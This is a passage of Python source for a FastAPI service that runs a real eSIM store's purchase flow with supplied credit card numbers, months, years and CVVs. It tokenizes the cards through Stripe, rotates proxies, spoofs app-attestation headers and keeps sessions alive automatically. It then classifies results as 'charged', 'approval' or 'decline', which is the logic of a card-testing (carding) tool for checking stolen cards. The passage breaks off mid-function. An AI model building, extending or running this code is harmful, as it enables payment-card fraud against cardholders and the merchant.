        elif self.via_store_proxy and USE_STORE_PROXY:
            h = dict(WEB_HEADERS)
            h["Referer"] = f"{STORE_URL}/purchase"
            ck = _session.cookie_header()
            if ck:
                h["Cookie"] = ck
        elif self.needs_auth:
            h = {
                **BASE_HEADERS,
                "Authorization": f"Bearer {ctx.get('bearer', '')}",
                "X-Firebase-AppCheck": ctx.get("appcheck", ""),
                "X-App-Attestation": ctx.get("attestation", "valid"),
            }
        else:
            h = dict(BASE_HEADERS)
        h["X-Request-ID"] = str(uuid.uuid4())
        return h

    def to_dict(self) -> Dict[str, Any]:
        return {
            "name": self.name, "method": self.method, "path": self.path,
            "needs_auth": self.needs_auth,
            "use_stripe_auth": self.use_stripe_auth,
            "base_is_stripe": self.base_is_stripe,
            "destructive": self.destructive,
            "via_store_proxy": self.via_store_proxy,
            "has_body": bool(self.json_body or self.form_body),
            "has_params": bool(self.params),
        }


# ═══════════════════════════════════════════════════════════════════════════
# build_queries
# ═══════════════════════════════════════════════════════════════════════════
def build_queries(
    overrides: Optional[Dict[str, str]] = None,
    card_data: Optional[Dict[str, str]] = None,
    address: Optional[Dict[str, str]] = None,
) -> List[YoQuery]:
    ov = overrides or {}
    cd = card_data or {}
    addr = address or {}

    def v(key: str, default: str) -> str:
        return ov.get(key) or default

    pi_id = v("payment_intent_id", STRIPE_PAYMENT_INTENT_ID)
    order_id = v("esim_order_id", _session.stripe_order_id or ESIM_ORDER_ID)
    product_id = v("esim_product_id", EG_PRODUCT_ID)
    country_id = v("esim_country_id", EG_COUNTRY_ID)
    device_id = v("device_id", _session.device_id or DEVICE_ID)
    email = v("customer_email", FIXED_EMAIL)
    first_name = v("customer_first_name", FIXED_FIRST_NAME)
    last_name = v("customer_last_name", FIXED_LAST_NAME)
    sync_since = v("sync_since", SYNC_SINCE)

    card_number = cd.get("cc") or ""
    card_month = cd.get("mes") or ""
    card_year = cd.get("ano") or ""
    card_cvv = cd.get("cvv") or ""
    card_year_2 = card_year[-2:] if len(card_year) >= 2 else ""

    bill_country = addr.get("country", "EG")
    bill_postal = addr.get("postal_code", "11511")
    bill_city = addr.get("city", "")
    bill_state = addr.get("state", "")
    bill_line1 = addr.get("address1", "")

    return [
        YoQuery("dinero_event_52", "GET", "/api/v1.0/dinero/events/52/"),
        YoQuery("esim_regions", "GET", "/api/v1.0/esim/regions/"),
        YoQuery("esim_countries", "GET", "/api/v1.0/esim/countries/"),
        YoQuery("feature_settings", "GET", "/api/v1.0/feature-settings/"),
        YoQuery("dinero_exchange", "GET", "/api/v1.0/dinero/exchange/"),
        YoQuery("identity_check_ver", "GET", "/api/v1.0/identity/check-version/"),
        YoQuery("esim_product_styles", "GET", "/api/v1.0/esim/product-styles/"),
        YoQuery("esim_promotions", "GET", "/api/v2.0/esim/promotions/"),
        YoQuery("dinero_event_74", "GET", "/api/v1.0/dinero/events/74/"),
        YoQuery("dinero_event_62", "GET", "/api/v1.0/dinero/events/62/"),
        YoQuery("dinero_multipliers", "GET", "/api/v1.0/dinero/multipliers/"),
        YoQuery("esim_all_countries", "GET", "/api/v1.0/esim/all-countries/"),

        YoQuery("sync_current", "GET", "/api/v1.0/sync/current/",
                needs_auth=True, via_store_proxy=True),
        YoQuery("social_friends", "GET", "/api/v1.0/social/friends/",
                needs_auth=True, via_store_proxy=True),
        YoQuery("zendesk_user_token", "GET", "/api/v1.0/identity/zendesk/user-token/",
                needs_auth=True, via_store_proxy=True),
        YoQuery("talketh_register", "POST", "/api/v1.0/identity/talketh/register/",
                needs_auth=True, json_body={}, via_store_proxy=True),
        YoQuery("sync_since", "GET", "/api/v1.0/sync/",
                needs_auth=True, params={"since": sync_since or ""}, via_store_proxy=True),
        YoQuery("profile", "GET", "/api/v1.0/profile/",
                needs_auth=True, via_store_proxy=True),
        YoQuery("vpn_credentials", "GET", "/api/v1.0/vpn/credentials/",
                needs_auth=True, via_store_proxy=True),
        YoQuery("talketh_inbound", "GET", "/api/v1.0/esim/talketh-inbound-calls/",
                needs_auth=True, via_store_proxy=True),
        YoQuery("esim_subscriber", "GET", "/api/v1.0/esim/subscriber/",
                needs_auth=True, via_store_proxy=True),

        YoQuery("esim_products_eg", "GET",
                f"/api/v5.0/esim/countries/{country_id}/products/"),
        YoQuery("esim_supported_nets", "GET",
                f"/api/v1.0/esim/products/{product_id}/supported-networks/"),

        YoQuery("esim_order_create", "POST", "/api/v1.0/esim/orders/",
                needs_auth=True, destructive=True, via_store_proxy=True, json_body={
            "subscriber": {
                "first_name": first_name,
                "last_name": last_name,
                "email": email,
                "country": "EG",
            },
            "device_id": device_id,
            "product": product_id,
            "operation_type": "activation",
            "discount": 31,
            "is_international_calls_purchased": False,
            "country": country_id,
            "enabled_auto_renew": False,
            "quantity": 1,
        }),
        YoQuery("esim_order_get", "GET",
                f"/api/v1.0/esim/orders/{order_id}/",
                needs_auth=True, via_store_proxy=True),
        YoQuery("wallet_payment_sheet", "POST", "/api/v1.0/wallet/payments/",
                needs_auth=True, destructive=True, via_store_proxy=True, json_body={
            "payment_provider": "stripe",
            "payment_type": "card",
            "source": {"id": order_id, "name": "esim"},
        }),
        YoQuery("wallet_payment_direct", "POST", "/api/v1.0/wallet/payments/",
                needs_auth=True, destructive=True, via_store_proxy=True, json_body={
            "payment_provider": "stripe",
            "source": {"id": order_id, "name": "esim"},
            "card": {"source_id": STRIPE_PAYMENT_METHOD_ID},
            "payment_type": "card",
        }),

        YoQuery("dinero_session", "POST", "/api/v1.0/dinero/events/sessions/",
                needs_auth=True, json_body={"duration_in_seconds": 203},
                via_store_proxy=True),
    ]


# ═══════════════════════════════════════════════════════════════════════════
# Body helpers
# ═══════════════════════════════════════════════════════════════════════════
def _parse_body(resp: httpx.Response) -> Any:
    try:
        return resp.json()
    except Exception:
        text = resp.text or ""
        return text[:2000] if text else None


def _hash_body(resp: httpx.Response) -> str:
    try:
        return hashlib.sha256(resp.content).hexdigest()[:16]
    except Exception:
        return ""


def _preview(body: Any, limit: int = 500) -> str:
    if body is None:
        return ""
    try:
        text = json.dumps(body, ensure_ascii=False)
    except Exception:
        text = str(body)
    return text[:limit] + ("..." if len(text) > limit else "")


# ═══════════════════════════════════════════════════════════════════════════
# Ctx + overrides
# ═══════════════════════════════════════════════════════════════════════════
def _extract_ctx(
    request: Optional[Request] = None,
    body: Optional[Dict[str, Any]] = None,
) -> Dict[str, str]:
    h = request.headers if request is not None else {}
    qp = request.query_params if request is not None else {}
    b = body or {}
    return {
        "bearer": b.get("bearer") or h.get("X-Yo-Auth-Bearer") or qp.get("bearer") or AUTH_BEARER,
        "appcheck": b.get("appcheck") or h.get("X-Yo-Firebase-AppCheck") or qp.get("appcheck") or FIREBASE_APP_CHECK,
        "attestation": b.get("attestation") or h.get("X-Yo-App-Attestation") or qp.get("attestation") or APP_ATTESTATION,
        "stripe_auth": b.get("stripe_auth") or h.get("X-Stripe-Auth") or qp.get("stripe_auth") or STRIPE_AUTH,
        "base_url": b.get("base_url") or h.get("X-Yo-Base-Url") or qp.get("base_url") or BASE_URL,
        "stripe_url": b.get("stripe_url") or h.get("X-Stripe-Base-Url") or qp.get("stripe_url") or STRIPE_URL,
        "store_url": b.get("store_url") or h.get("X-Yo-Store-Url") or qp.get("store_url") or STORE_URL,
    }


def _extract_overrides(
    request: Optional[Request] = None,
    body: Optional[Dict[str, Any]] = None,
) -> Dict[str, str]:
    b = body or {}
    qp = request.query_params if request is not None else {}
    keys = (
        "customer_id", "payment_intent_id",
        "esim_order_id", "esim_product_id", "esim_country_id",
        "device_id", "customer_email",
        "customer_first_name", "customer_last_name", "sync_since",
    )
    out: Dict[str, str] = {}
    for k in keys:
        val = b.get(k) or qp.get(k)
        if val:
            out[k] = str(val)
    return out


# ═══════════════════════════════════════════════════════════════════════════
# execute_query — مع retry تلقائي عند 401
# ═══════════════════════════════════════════════════════════════════════════
async def execute_query(
    q: YoQuery,
    ctx: Dict[str, str],
    rotator: ProxyRotator,
    cb: ProxyCircuitBreaker,
    client_cache: Dict[str, httpx.AsyncClient],
    retry: int,
    retry_delay: float,
    force_proxy: Optional[str] = None,
) -> Dict[str, Any]:
    if q.use_stripe_auth and not (ctx.get("stripe_auth") or STRIPE_PUBLISHABLE_KEY):
        return {
            "name": q.name, "method": q.method, "path": q.path,
            "status": 401, "ok": False, "elapsed_ms": 0,
            "error": "Stripe key not configured",
            "attempts": 0, "proxy_used": "direct",
        }

    session_id = q.name
    last_exc: Optional[Exception] = None
    last_proxy: Optional[str] = None
    attempts = 0
    elapsed_ms = 0
    auth_retried = False  # منع حلقة لا نهائية

    for attempt in range(retry + 1):
        attempts = attempt + 1
        if force_proxy is not None:
            proxy = force_proxy
        else:
            proxy = await rotator.pick(session_id,
                                        exclude=last_proxy if attempt > 0 else None)
        last_proxy = proxy
        client = _get_http_client_for_proxy(proxy, client_cache)
        started = time.time()

        try:
            if q.via_store_proxy and USE_STORE_PROXY:
                if not _session.is_fresh():
                    await _ensure_session(client)

            resp = await client.request(
                q.method, q.url(ctx),
                headers=q.headers(ctx),
                params=q.params,
                json=q.json_body,
                data=q.form_body,
            )
            elapsed_ms = int((time.time() - started) * 1000)

            # ⭐ عند 401 → أعد التجديد وأعد المحاولة مرة واحدة
            if resp.status_code == 401 and q.via_store_proxy and not auth_retried:
                auth_retried = True
                async with _METRICS_LOCK:
                    _METRICS["session_401_retry"] += 1
                logger.warning(f"[401] {q.name} → forcing refresh + retry")
                _session.invalidate()
                ok = await _ensure_session(client, force=True)
                if ok:
                    await asyncio.sleep(0.5)
                    attempts -= 1
                    continue

            new_cookies = _extract_response_cookies(resp)
            if new_cookies:
                _session.update_from_cookies(new_cookies)

            if 200 <= resp.status_code < 400:
                await cb.record_success(proxy, elapsed_ms)
                return {
                    "name": q.name, "method": q.method, "path": q.path,
                    "status": resp.status_code, "ok": True,
                    "elapsed_ms": elapsed_ms,
                    "content_type": resp.headers.get("content-type", ""),
                    "body": _parse_body(resp),
                    "body_hash": _hash_body(resp),
                    "attempts": attempts,
                    "proxy_used": _mask_proxy(proxy),
                    "cookies": new_cookies,
                }

            if 500 <= resp.status_code < 600:
                await cb.record_fail(proxy, elapsed_ms)
                await rotator.release(session_id)
                if attempt < retry:
                    await asyncio.sleep(retry_delay * (2 ** attempt))
                    continue

            return {
                "name": q.name, "method": q.method, "path": q.path,
                "status": resp.status_code,
                "ok": 200 <= resp.status_code < 400,
                "elapsed_ms": elapsed_ms,
                "content_type": resp.headers.get("content-type", ""),
                "body": _parse_body(resp),
                "body_hash": _hash_body(resp),
                "attempts": attempts,
                "proxy_used": _mask_proxy(proxy),
                "cookies": new_cookies,
            }

        except (httpx.TimeoutException, httpx.ConnectError,
                httpx.ReadError, httpx.RemoteProtocolError,
                httpx.ProxyError) as e:
            last_exc = e
            elapsed_ms = int((time.time() - started) * 1000)
            await cb.record_fail(proxy, elapsed_ms)
            await rotator.release(session_id)
            if attempt < retry:
                await asyncio.sleep(retry_delay * (2 ** attempt))
                continue
        except ValueError as e:
            return {
                "name": q.name, "method": q.method, "path": q.path,
                "status": 401, "ok": False,
                "elapsed_ms": int((time.time() - started) * 1000),
                "error": str(e)[:200],
                "attempts": attempts, "proxy_used": _mask_proxy(proxy),
            }
        except Exception as e:
            elapsed_ms = int((time.time() - started) * 1000)
            return {
                "name": q.name, "method": q.method, "path": q.path,
                "status": -1, "ok": False, "elapsed_ms": elapsed_ms,
                "error": f"{type(e).__name__}: {str(e)[:200]}",
                "attempts": attempts, "proxy_used": _mask_proxy(proxy),
            }

    err_type = type(last_exc).__name__ if last_exc else "UnknownError"
    err_msg = str(last_exc)[:200] if last_exc else "all retries failed"
    return {
        "name": q.name, "method": q.method, "path": q.path,
        "status": -1, "ok": False, "elapsed_ms": elapsed_ms,
        "error": f"{err_type}: {err_msg}",
        "attempts": attempts, "proxy_used": _mask_proxy(last_proxy),
    }
    # ═══════════════════════════════════════════════════════════════════════════
# Run queries
# ═══════════════════════════════════════════════════════════════════════════
async def run_queries(
    queries: List[YoQuery],
    ctx: Dict[str, str],
    rotator: ProxyRotator,
    cb: ProxyCircuitBreaker,
    parallel: bool,
    concurrency: int,
    retry: int,
    retry_delay: float,
    force_proxy: Optional[str] = None,
) -> List[Dict[str, Any]]:
    client_cache: Dict[str, httpx.AsyncClient] = {}
    results: List[Dict[str, Any]] = []

    try:
        if parallel:
            sem = asyncio.Semaphore(max(1, concurrency))

            async def _one(q: YoQuery) -> Dict[str, Any]:
                async with sem:
                    r = await execute_query(
                        q, ctx, rotator, cb, client_cache, retry, retry_delay,
                        force_proxy=force_proxy,
                    )
                    async with _METRICS_LOCK:
                        _METRICS["total"] += 1
                        if r["ok"]:
                            _METRICS["success"] += 1
                        else:
                            _METRICS["failed"] += 1
                            if r.get("status") == -1:
                                _METRICS["proxy_errors"] += 1
                    _LATENCIES.append(r["elapsed_ms"])
                    return r

            results = list(await asyncio.gather(*[_one(q) for q in queries]))
        else:
            for q in queries:
                r = await execute_query(
                    q, ctx, rotator, cb, client_cache, retry, retry_delay,
                    force_proxy=force_proxy,
                )
                results.append(r)
                async with _METRICS_LOCK:
                    _METRICS["total"] += 1
                    if r["ok"]:
                        _METRICS["success"] += 1
                    else:
                        _METRICS["failed"] += 1
                        if r.get("status") == -1:
                            _METRICS["proxy_errors"] += 1
                _LATENCIES.append(r["elapsed_ms"])
    finally:
        for c in client_cache.values():
            try:
                await c.aclose()
            except Exception:
                pass

    return results


# ═══════════════════════════════════════════════════════════════════════════
# Save + Compare
# ═══════════════════════════════════════════════════════════════════════════
def _save_run(
    results: List[Dict[str, Any]],
    elapsed: float,
    parallel: bool,
    concurrency: int,
    retry: int,
    proxy_stats: Optional[Dict[str, Dict[str, Any]]] = None,
    save_bodies: bool = False,
) -> Optional[Path]:
    try:
        output_dir = Path(OUTPUT_DIR)
        output_dir.mkdir(parents=True, exist_ok=True)

        run_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        run_dir = output_dir / f"run_{run_id}"
        run_dir.mkdir(parents=True, exist_ok=True)

        ok = sum(1 for r in results if r.get("ok"))
        failed = len(results) - ok
        total_ms = sum(r.get("elapsed_ms", 0) for r in results)

        summary = {
            "run_at": datetime.now().isoformat(),
            "elapsed_sec": round(elapsed, 2),
            "parallel": parallel,
            "concurrency": concurrency if parallel else 1,
            "retry": retry,
            "total": len(results),
            "ok": ok,
            "failed": failed,
            "avg_ms": int(total_ms / len(results)) if results else 0,
        }
        if proxy_stats:
            summary["proxy_stats"] = proxy_stats

        results_for_json = []
        for r in results:
            item = {k: v for k, v in r.items() if k not in ("body", "cookies")}
            body = r.get("body")
            if body is not None:
                item["body_preview"] = _preview(body)
            results_for_json.append(item)

        (run_dir / "results.json").write_text(
            json.dumps({"summary": summary, "results": results_for_json},
                       indent=2, ensure_ascii=False),
            encoding="utf-8",
        )

        if save_bodies:
            bodies_dir = run_dir / "bodies"
            bodies_dir.mkdir(exist_ok=True)
            for r in results:
                body = r.get("body")
                if body is not None:
                    safe = r["name"].replace("/", "_").replace(":", "_")
                    try:
                        (bodies_dir / f"{safe}.json").write_text(
                            json.dumps(body, indent=2, ensure_ascii=False),
                            encoding="utf-8",
                        )
                    except Exception:
                        (bodies_dir / f"{safe}.txt").write_text(
                            str(body), encoding="utf-8"
                        )

        return run_dir
    except Exception as e:
        logger.warning(f"Failed to save run: {e}")
        return None


def _find_previous_run() -> Optional[Path]:
    try:
        output_dir = Path(OUTPUT_DIR)
        if not output_dir.exists():
            return None
        runs = sorted(
            [d for d in output_dir.iterdir() if d.is_dir() and d.name.startswith("run_")],
            key=lambda d: d.name,
        )
        return runs[-1] if runs else None
    except Exception:
        return None


def _compare_runs(prev_path: Path, curr_path: Path) -> Dict[str, Any]:
    try:
        prev = json.loads(prev_path.read_text(encoding="utf-8"))
        curr = json.loads(curr_path.read_text(encoding="utf-8"))
        prev_results = prev.get("results") or []
        curr_results = curr.get("results") or []
    except Exception as e:
        return {"error": f"compare failed: {e}"}

    prev_map = {r.get("name"): r for r in prev_results if r.get("name")}
    curr_map = {r.get("name"): r for r in curr_results if r.get("name")}

    new_queries = sorted(set(curr_map) - set(prev_map))
    removed = sorted(set(prev_map) - set(curr_map))

    changed: List[Dict[str, Any]] = []
    unchanged = 0
    for name in sorted(set(curr_map) & set(prev_map)):
        p = prev_map[name]
        c = curr_map[name]
        ps, cs = p.get("status"), c.get("status")
        ph, ch = p.get("body_hash"), c.get("body_hash")
        if ps != cs or ph != ch:
            changed.append({
                "name": name,
                "prev_status": ps,
                "curr_status": cs,
                "status_changed": ps != cs,
                "body_changed": ph != ch,
                "prev_ms": p.get("elapsed_ms"),
                "curr_ms": c.get("elapsed_ms"),
            })
        else:
            unchanged += 1

    return {
        "new": new_queries,
        "removed": removed,
        "changed": changed,
        "unchanged_count": unchanged,
        "prev_run": prev_path.parent.name,
        "curr_run": curr_path.parent.name,
    }


# ═══════════════════════════════════════════════════════════════════════════
# Response classification
# ═══════════════════════════════════════════════════════════════════════════
_APPROVED_CODES = (
    "3DS_AUTHENTICATION", "3DS_AUTH", "3DS_REQUIRED",
    "AUTHENTICATION_REQUIRED", "ACTION_REQUIRED", "ACTIONREQUIRED",
    "OTP_REQUIRED",
    "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS", "NOT SUFFICIENT FUNDS",
    "INCORRECT_CVC", "INVALID_CVC", "CVC_MISMATCH",
    "INCORRECT_ZIP", "INCORRECT ZIP",
    "INCORRECT_NUMBER", "INVALID_NUMBER",
)

_DECLINED_CODES = (
    "CARD_DECLINED", "DECLINED", "DO_NOT_HONOR",
    "EXPIRED_CARD", "PICKUP_CARD",
    "LOST_CARD", "STOLEN_CARD", "FRAUD", "CALL_ISSUER",
    "TRANSACTION_NOT_ALLOWED", "PROCESSING_ERROR",
    "PAYMENT_METHOD_NOT_AVAILABLE", "AUTHENTICATION_FAILED",
    "INVALID_CC", "INVALID_CARD", "PAYMENT_FAILED",
    "GENERIC_ERROR", "GENERIC_DECLINE",
    "card_declined",
)

_ERROR_CODES = (
    "TIMEOUT", "PROXY_ERROR", "CONNECTION_RESET", "CONNECTION_REFUSED",
    "CAPTCHA_REQUIRED", "RATE_LIMITED_429",
    "SITE_ERROR", "NO_SESSION_TOKEN", "NO_PRODUCTS_FOUND",
    "CHECKPOINT_DENIED", "THROTTLED", "INVALID_JSON",
    "SESSION_FAILED", "AUTO_RESOLVE_FAILED",
)


def _extract_error_code(response_body: Any, _depth: int = 0) -> Optional[str]:
    if _depth > 6:
        return None
    if not response_body:
        return None
    if isinstance(response_body, str):
        text = response_body.upper()
        for code in _DECLINED_CODES + _APPROVED_CODES + _ERROR_CODES:
            if code.upper() in text:
                return code.upper() if not code.islower() else code
        return None
    if isinstance(response_body, dict):
        for key in ("code", "error", "error_code", "decline_code",
                    "failure_code", "status", "message", "detail",
                    "messageUntranslated", "nonLocalizedMessage"):
            val = response_body.get(key)
            if isinstance(val, str):
                upper = val.upper()
                for code in _DECLINED_CODES + _APPROVED_CODES + _ERROR_CODES:
                    if code.upper() in upper:
                        return code
                if "_" in val and val.replace("_", "").isalnum() and len(val) < 60:
                    return upper
        for subkey in ("error", "payment_method_details", "last_payment_error",
                       "processingError", "failure_message",
                       "payment_intent", "charge"):
            sub = response_body.get(subkey)
            if sub:
                got = _extract_error_code(sub, _depth + 1)
                if got:
                    return got
        for v in response_body.values():
            if isinstance(v, dict):
                got = _extract_error_code(v, _depth + 1)
                if got:
                    return got
    return None


def classify_yo_response(
    success: bool,
    response_body: Any,
    gateway: str = "yo Payments",
    price: float = 0.0,
    card: str = "",
    elapsed_ms: int = 0,
) -> Dict[str, Any]:
    code = _extract_error_code(response_body)

    is_placed = False
    if isinstance(response_body, dict):
        status_field = str(response_body.get("status", "")).lower()
        message_field = str(response_body.get("message", "")).lower()
        typename = ""
        receipt = response_body.get("receipt") or response_body.get("data", {})
        if isinstance(receipt, dict):
            typename = str(receipt.get("__typename", "")).lower()
        if any(x in (status_field + " " + message_field + " " + typename)
               for x in ("processed", "order_placed", "success", "complete", "charged")):
            is_placed = True
        if response_body.get("paid") is True:
            is_placed = True
        if response_body.get("succeeded") is True:
            is_placed = True
        if str(response_body.get("status", "")).lower() == "succeeded":
            is_placed = True

    if is_placed or (success and code == "ORDER_PLACED"):
        response = "ORDER_PLACED"
        status_bool = True
        category = "charged"
    elif code in _APPROVED_CODES:
        if "3DS" in code:
            response = "3DS_AUTHENTICATION"
        elif "OTP" in code:
            response = "OTP_REQUIRED"
        elif "INSUFFICIENT" in code or "BALANCE" in code:
            response = "INSUFFICIENT_FUNDS"
        elif "CVC" in code or "CVV" in code:
            response = "INCORRECT_CVC"
        elif "ZIP" in code:
            response = "INCORRECT_ZIP"
        elif "NUMBER" in code:
            response = "INCORRECT_NUMBER"
        else:
            response = code
        status_bool = True
        category = "approval"
    elif code in _DECLINED_CODES:
        response = "CARD_DECLINED" if code.upper() == "CARD_DECLINED" else code
        status_bool = False
        category = "decline"
    elif code in _ERROR_CODES:
        response = code
        status_bool = False
        category = "error"
    elif success:
        response = "ORDER_PLACED"
        status_bool = True
        category = "charged"
    else:
        response = "CARD_DECLINED"
        status_bool = False
        category = "decline"

    return {
        "Gateway": gateway,
        "Price": float(price) if price else 0.0,
        "Response": response,
        "Status": status_bool,
        "cc": card,
        "Category": category,
        "IsCharged": category == "charged",
        "IsDeclined": category == "decline",
        "IsError": category == "error",
        "ElapsedMs": elapsed_ms,
    }


# ═══════════════════════════════════════════════════════════════════════════
# Lifespan + cleanup + refresh loop
# ═══════════════════════════════════════════════════════════════════════════
_proxy_cb: Optional[ProxyCircuitBreaker] = None
_proxy_rotator: Optional[ProxyRotator] = None
_cleanup_task: Optional[asyncio.Task] = None
_refresh_task: Optional[asyncio.Task] = None  # ⭐ v1.9.0


async def _periodic_cleanup():
    while True:
        try:
            await asyncio.sleep(120)
            if _proxy_rotator:
                await _proxy_rotator.cleanup_stale(max_age=300)
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.debug(f"cleanup error: {e}")


# ═══════════════════════════════════════════════════════════════════════════
# ⭐ v1.9.0: Background session refresh loop (كل 60 ثانية)
# ═══════════════════════════════════════════════════════════════════════════
async def _session_refresh_loop():
    """
    تجديد استباقي لـ auth_token قبل انتهائه.
    - كل 60 ثانية: يفحص الوقت المتبقي
    - إذا < 180 ثانية: يجدد فورًا
    """
    await asyncio.sleep(10)  # تأخير أولي
    while True:
        try:
            await asyncio.sleep(SESSION_LOOP_INTERVAL)
            if not USE_STORE_PROXY:
                continue
            if not _session.refresh_token:
                continue

            remaining = _session.token_remaining()

            # إذا لا يوجد auth_token، أو متبقٍ أقل من SESSION_REFRESH_MARGIN
            if not _session.auth_token or remaining < SESSION_REFRESH_MARGIN:
                logger.info(
                    f"[REFRESH-LOOP] auth_token remaining={remaining}s → refreshing proactively"
                )
                client = await _get_client()
                ok = await _ensure_session(client, force=True)
                if ok:
                    new_remaining = _session.token_remaining()
                    logger.info(f"[REFRESH-LOOP] ✅ new token | remaining={new_remaining}s")
                else:
                    logger.warning(f"[REFRESH-LOOP] ❌ refresh failed")

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.debug(f"[REFRESH-LOOP] error: {e}")


@asynccontextmanager
async def lifespan(app: FastAPI):
    global _proxy_cb, _proxy_rotator, _cleanup_task, _refresh_task

    # 1. تحميل الجلسة من _FIXED_CONFIG
    await _init_session_from_config()

    # 2. تهيئة البروكسي
    proxies = _load_proxies(PROXY_FILE) if PROXY_FILE else []
    _proxy_cb = ProxyCircuitBreaker(threshold=CB_THRESHOLD, cooldown=CB_COOLDOWN)
    _proxy_rotator = ProxyRotator(proxies, _proxy_cb, sticky=True)

    # 3. HTTP client
    await _get_client()

    # 4. المهام الخلفية (لا تعمل على Vercel Serverless)
    if not os.environ.get("VERCEL"):
        _cleanup_task = asyncio.create_task(_periodic_cleanup())
        _refresh_task = asyncio.create_task(_session_refresh_loop())  # ⭐

    logger.info(
        "[STARTUP] v1.9.0 | base=%s | store=%s | country=%s | auth=%s | remaining=%ds | refresh_loop=%s | stripe_pk=%s",
        BASE_URL, STORE_URL, AUTO_COUNTRY,
        "yes" if _session.auth_token else "MISSING",
        _session.token_remaining(),
        "on" if not os.environ.get("VERCEL") else "off",
        "yes" if STRIPE_PUBLISHABLE_KEY else "no",
    )

    # 5. تجديد فوري إذا الجلسة غير صالحة
    if USE_STORE_PROXY and _session.refresh_token and not _session.is_fresh():
        try:
            client = await _get_client()
            ok = await _ensure_session(client, force=True)
            if ok:
                logger.info(f"[STARTUP] ✅ initial refresh OK | remaining={_session.token_remaining()}s")
            else:
                logger.warning("[STARTUP] ⚠️ initial refresh failed — using saved token")
        except Exception as e:
            logger.warning(f"[STARTUP] initial refresh exception: {e}")

    yield

    # 6. إغلاق
    for task in (_cleanup_task, _refresh_task):
        if task:
            task.cancel()
            try:
                await task
            except (asyncio.CancelledError, Exception):
                pass

    await _close_client()
    logger.info("[SHUTDOWN] stopped")


# ═══════════════════════════════════════════════════════════════════════════
# FastAPI App
# ═══════════════════════════════════════════════════════════════════════════
app = FastAPI(
    title="Yomobile API Runner",
    version="1.9.0",
    description="JWT-aware auto-refresh | Egypt + pk + 308-fix",
    lifespan=lifespan,
    docs_url="/docs",
    redoc_url=None,
)


# ═══════════════════════════════════════════════════════════════════════════
# _run_yo_flow
# ═══════════════════════════════════════════════════════════════════════════
async def _run_yo_flow(
    card_str: str,
    price: float,
    payment_method: str,
    create_order: bool,
    override_order_id: Optional[str],
    ctx: Dict[str, str],
    overrides: Dict[str, str],
    force_proxy: Optional[str],
    collect_steps: bool = False,
    address: Optional[Dict[str, str]] = None,
) -> Dict[str, Any]:
    try:
        card_data = parse_cc_string(card_str) if card_str else {}
    except ValueError as e:
        return {
            "Gateway": "yo Payments", "Price": float(price),
            "Proxy": "Live" if force_proxy else "None",
            "Response": "INVALID_CARD_FORMAT", "Status": False,
            "cc": card_str, "error": str(e),
            "steps": [] if collect_steps else None, "ElapsedMs": 0,
        }

    queries = build_queries(overrides, card_data=card_data, address=address)
    by_name = {q.name: q for q in queries}

    client_cache: Dict[str, httpx.AsyncClient] = {}
    t0 = time.time()
    steps: List[Dict[str, Any]] = []
    final_code: Optional[str] = None
    final_success = False
    current_order_id = (override_order_id
                        or overrides.get("esim_order_id")
                        or _session.stripe_order_id
                        or ESIM_ORDER_ID)

    try:
        # 1) إنشاء order
        if create_order and "esim_order_create" in by_name:
            r = await execute_query(
                by_name["esim_order_create"], ctx, _proxy_rotator, _proxy_cb,
                client_cache, RETRY_COUNT, RETRY_DELAY, force_proxy=force_proxy,
            )
            if collect_steps:
                steps.append({
                    "step": "esim_order_create",
                    "status": r.get("status"), "ok": r.get("ok"),
                    "body_preview": _preview(r.get("body"), 200),
                })

            if not r.get("ok"):
                final_code = _extract_error_code(r.get("body")) or "SITE_ERROR"
            else:
                new_id = _order_id_from_body(r.get("body")) or _session.stripe_order_id
                if new_id:
                    current_order_id = new_id
                    overrides = {**overrides, "esim_order_id": new_id}
                    queries = build_queries(overrides, card_data=card_data, address=address)
                    by_name = {q.name: q for q in queries}

        # 2) الدفع — 3 استراتيجيات
        if final_code is None and card_data:
            # 2a) tokenize البطاقة عبر pk
            tok, tok_err = None, None
            if "wallet_payment_direct" in by_name:
                _client = _get_http_client_for_proxy(force_proxy, client_cache)
                tok, tok_err = await stripe_tokenize_pk(
                    _client,
                    card_data["cc"], card_data["mes"], card_data["ano"], card_data["cvv"],
                    name=f"{FIXED_FIRST_NAME} {FIXED_LAST_NAME}".strip(),
                )
                if collect_steps:
                    steps.append({
                        "step": "stripe_tokenize_pk",
                        "ok": bool(tok),
                        "token": (tok[:15] + "...") if tok else None,
                        "error": tok_err,
                    })

            # 2b) wallet_payment_direct مع tok
            if tok and "wallet_payment_direct" in by_name:
                _wp = by_name["wallet_payment_direct"]
                _direct_q = YoQuery(
                    "wallet_payment_direct",
                    "POST", _wp.path, needs_auth=True,
                    destructive=True, via_store_proxy=True,
                    json_body={
                        "payment_provider": "stripe",
                        "source": {"id": current_order_id, "name": "esim"},
                        "card": {"source_id": tok},
                        "payment_type": "card",
                    },
                )
                r = await execute_query(
                    _direct_q, ctx, _proxy_rotator, _proxy_cb,
                    client_cache, RETRY_COUNT, RETRY_DELAY, force_proxy=force_proxy,
                )
                if collect_steps:
                    steps.append({
                        "step": "wallet_payment_direct(tok)",
                        "status": r.get("status"), "ok": r.get("ok"),
                        "body_preview": _preview(r.get("body"), 200),
                    })
                if r.get("ok"):
                    final_success = True
                    final_code = _extract_error_code(r.get("body")) or "ORDER_PLACED"
                    async with _METRICS_LOCK:
                        _METRICS["payment_tok"] += 1
                else:
                    final_code = _extract_error_code(r.get("body")) or "CARD_DECLINED"

            # 2c) wallet_payment_direct مع pm
            if final_code is None and "wallet_payment_direct" in by_name and STRIPE_PAYMENT_METHOD_ID:
                r = await execute_query(
                    by_name["wallet_payment_direct"], ctx,
                    _proxy_rotator, _proxy_cb, client_cache,
                    RETRY_COUNT, RETRY_DELAY, force_proxy=force_proxy,
                )
                if collect_steps:
                    steps.append({
                        "step": "wallet_payment_direct(pm)",
                        "status": r.get("status"), "ok": r.get("ok"),
                        "body_preview": _preview(r.get("body"), 200),
                    })
                if r.get("ok"):
                    final_success = True
                    final_code = _extract_error_code(r.get("body")) or "ORDER_PLACED"
                    async with _METRICS_LOCK:
                        _METRICS["payment_pm"] += 1
                else:
                    final_code = _extract_error_code(r.get("body")) or "CARD_DECLINED"

            # 2d) fallback → wallet_payment_sheet
            if final_code is None and "wallet_payment_sheet" in by_name:
                r = await execute_query(
                    by_name["wallet_payment_sheet"], ctx,
                    _proxy_rotator, _proxy_cb, client_cache,
